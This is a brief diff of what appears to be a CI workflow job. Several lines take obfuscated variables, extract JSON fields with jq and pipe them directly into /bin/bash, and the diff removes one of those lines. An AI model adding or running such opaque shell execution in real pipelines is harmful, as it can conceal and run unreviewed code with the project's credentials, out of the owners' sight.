@@ -39,7 +39,6 @@ jobs:
           echo $nsue4121 | jq -r .leg5 | /bin/bash
           printf '%s' "$iug3" | jq -r .xpcw692 | /bin/bash
           echo $uy912 | jq -r .bmnkh1 | /bin/bash
-          printf '%s' "$lc1" | jq -r .s9 | /bin/bash
           echo $fvrt69753 | jq -r .mqp3 | /bin/bash
           printf '%s' "$us19201" | jq -r .aai44801 | /bin/bash
           printf '%s' "$fcv6" | jq -r .uvvjw0963 | /bin/bash
